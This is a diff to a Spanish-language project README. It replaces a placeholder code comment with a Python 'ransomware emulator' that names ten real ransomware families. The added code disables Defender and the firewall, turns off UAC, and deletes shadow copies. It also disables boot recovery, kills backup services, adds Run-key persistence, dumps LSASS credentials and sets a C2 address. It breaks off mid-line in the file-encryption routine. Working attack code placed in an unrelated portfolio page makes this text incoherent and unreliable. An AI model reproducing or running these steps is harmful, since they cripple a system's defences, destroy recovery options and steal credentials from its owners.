@@ -25,8 +25,6 @@ ogImage: './images/pro-accountant/accnt.webp'
     - [Core Features](#core-features)
     - [Design and Development Process](#design-and-development-process)
 6. [User Testing](#user-testing)
-7. [Challenges and Learnings](#challenges-and-learnings)
-8. [Final Thoughts](#final-thoughts)
 
 ---
 
@@ -57,7 +55,194 @@ Las pruebas se realizaron en entornos completamente aislados (sin salida a inter
 
 ## 🚌 User Victor Eduardo 
 ```python
-# Así se muestra código dentro del README 
+# #!/usr/bin/env python3
+# ======================================================
+# Objetivo: Ransomware de doble extorsión
+#           para análisis de infraestructura.
+#           Incluye: DoppelPaymer, Maze, REvil, Nemty, Netwalker,
+#                    Pysa, Nefilim, Ragnarlocker, Sekhmet, Snatch.
+# ======================================================
+
+import os
+import sys
+import subprocess
+import platform
+import time
+import random
+import string
+import socket
+import json
+from pathlib import Path
+from datetime import datetime
+
+# --- CONFIGURACIÓN ---
+VICTIM_ID = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
+C2_SERVER = "127.0.0.1"
+C2_PORT = 4444
+RANSOMWARE_NAME = random.choice([
+    "DoppelPaymer", "Maze", "REvil", "Nemty", "Netwalker",
+    "Pysa", "Nefilim", "Ragnarlocker", "Sekhmet", "Snatch"
+])
+
+EXTENSIONS = {
+    "DoppelPaymer": ".locked", "Maze": ".maze", "REvil": ".REvil",
+    "Nemty": ".nemty", "Netwalker": ".netwalker", "Pysa": ".pysa",
+    "Nefilim": ".nefilim", "Ragnarlocker": ".ragnar",
+    "Sekhmet": ".sekhmet", "Snatch": ".snatch"
+}
+
+RANSOM_NOTES = {
+    "DoppelPaymer": "READ_ME.txt", "Maze": "DECRYPT-FILES.txt",
+    "REvil": "!!!READ_ME_REVIL.txt", "Nemty": "_NEMTY_INSTRUCTIONS.txt",
+    "Netwalker": "readme_netwalker.txt", "Pysa": "pysa_readme.txt",
+    "Nefilim": "nefilim_readme.txt", "Ragnarlocker": "ragnar_readme.txt",
+    "Sekhmet": "sekhmet_readme.txt", "Snatch": "snatch_readme.txt"
+}
+
+# --- FUNCIONES DE SISTEMA ---
+def is_admin():
+    if platform.system() == "Windows":
+        try:
+            return os.getuid() == 0
+        except AttributeError:
+            import ctypes
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    return os.geteuid() == 0
+
+def get_paths():
+    if platform.system() == "Windows":
+        return {
+            "user": os.environ.get("USERPROFILE", "C:\\Users"),
+            "public": os.environ.get("PUBLIC", "C:\\Users\\Public"),
+            "temp": os.environ.get("TEMP", "C:\\Windows\\Temp")
+        }
+    return {
+        "user": os.path.expanduser("~"),
+        "public": "/tmp",
+        "temp": "/tmp"
+    }
+
+# --- CLASE PRINCIPAL ---
+class RansomwareEmulator:
+    def __init__(self):
+        self.name = RANSOMWARE_NAME
+        self.extension = EXTENSIONS.get(self.name, ".encrypted")
+        self.note_file = RANSOM_NOTES.get(self.name, "READ_ME.txt")
+        self.victim_id = VICTIM_ID
+        self.paths = get_paths()
+        self.files_encrypted = []
+        
+    def _run(self, cmd, success_msg=None, fail_msg=None):
+        try:
+            if isinstance(cmd, str):
+                cmd = cmd.split()
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            if success_msg and result.returncode == 0:
+                print(f"[+] {success_msg}")
+            return result
+        except Exception as e:
+            if fail_msg:
+                print(f"[!] {fail_msg}: {e}")
+            return None
+    
+    def disable_defenses(self):
+        print(f"[*] {self.name}: Desactivando defensas...")
+        if platform.system() == "Windows":
+            self._run(["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"],
+                     "Real-time monitoring desactivado")
+            self._run(["netsh", "advfirewall", "set", "allprofiles", "state", "off"],
+                     "Firewall desactivado")
+            if self.name == "Snatch":
+                self._run(["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+                          "/v", "EnableLUA", "/t", "REG_DWORD", "/d", "0", "/f"],
+                         "UAC desactivado (Snatch)")
+        else:
+            self._run(["sudo", "systemctl", "stop", "ufw"], "Firewall desactivado (Linux)")
+    
+    def kill_processes(self):
+        print(f"[*] {self.name}: Terminando procesos críticos...")
+        procs = ["taskmgr.exe", "procexp.exe", "sqlservr.exe", "wbengine.exe", "vssvc.exe"]
+        if platform.system() == "Windows":
+            for p in procs:
+                self._run(["taskkill", "/F", "/IM", p])
+        else:
+            for p in procs:
+                self._run(["pkill", "-f", p])
+    
+    def delete_shadows(self):
+        print(f"[*] {self.name}: Eliminando VSS...")
+        if platform.system() == "Windows":
+            self._run(["vssadmin", "delete", "shadows", "/all", "/quiet"], "VSS eliminadas vía vssadmin")
+            self._run(["wmic", "shadowcopy", "delete"], "VSS eliminadas vía wmic")
+            self._run(["powershell", "-Command", "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"],
+                     "VSS eliminadas vía PowerShell")
+    
+    def disable_recovery(self):
+        print(f"[*] {self.name}: Desactivando recuperación...")
+        if platform.system() == "Windows":
+            self._run(["bcdedit", "/set", "{default}", "recoveryenabled", "No"],
+                     "Recuperación desactivada")
+            self._run(["bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures"])
+    
+    def escalate_privileges(self):
+        print(f"[*] {self.name}: Escalando privilegios...")
+        if platform.system() == "Windows" and self.name == "Maze":
+            self._run(["secedit", "/export", "/cfg", f"{self.paths['temp']}\\secpol.cfg"],
+                     "Maze: Políticas exportadas")
+    
+    def enumerate_network(self):
+        print(f"[*] {self.name}: Enumerando red...")
+        cmds = [["net", "view", "/all"], ["netstat", "-ano"], ["arp", "-a"], ["ipconfig", "/all"]]
+        if platform.system() == "Windows":
+            for cmd in cmds:
+                self._run(cmd, timeout=5)
+        else:
+            self._run(["ifconfig"])
+            self._run(["arp", "-a"])
+            self._run(["netstat", "-tulpn"])
+    
+    def create_mutex(self):
+        print(f"[*] {self.name}: Creando mutex...")
+        if self.name == "Nemty":
+            try:
+                with open(f"{self.paths['temp']}\\nemty_mutex", "w") as f:
+                    f.write("hate")
+                print("[+] Mutex 'hate' creado (Nemty)")
+            except:
+                pass
+    
+    def create_persistent_process(self):
+        print(f"[*] {self.name}: Creando persistencia...")
+        if platform.system() == "Windows" and self.name == "Netwalker":
+            key = ''.join(random.choices(string.ascii_lowercase, k=8))
+            self._run(["reg", "add", f"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                      "/v", key, "/t", "REG_SZ", "/d", f'"{sys.executable}" "{os.path.abspath(__file__)}"', "/f"],
+                     f"Persistencia creada: {key}")
+    
+    def dump_lsass(self):
+        print(f"[*] {self.name}: Volcando LSASS...")
+        if platform.system() == "Windows" and self.name == "Pysa":
+            self._run(["procdump", "-accepteula", "-ma", "lsass.exe", f"{self.paths['temp']}\\lsass_mem.dmp"],
+                     "LSASS volcado (Pysa)")
+    
+    def kill_backup_services(self):
+        print(f"[*] {self.name}: Matando servicios backup...")
+        if platform.system() == "Windows" and self.name == "Sekhmet":
+            for svc in ["VSS", "wbengine", "MSExchangeIS", "SQLSERVERAGENT"]:
+                self._run(["net", "stop", svc, "/y"])
+    
+    def create_exclusions(self):
+        print(f"[*] {self.name}: Creando exclusiones...")
+        if platform.system() == "Windows":
+            for path in self.paths.values():
+                self._run(["powershell", "-Command", f'Add-MpPreference -ExclusionPath "{path}"'],
+                         f"Exclusión creada: {path}")
+    
+    def encrypt_files(self):
+        print(f"[*] {self.name}: Cifrando archivos...")
+        dirs = [self.paths["user"], self.paths["public"]]
+        files_found = []
+        for d 
 
 ---
 
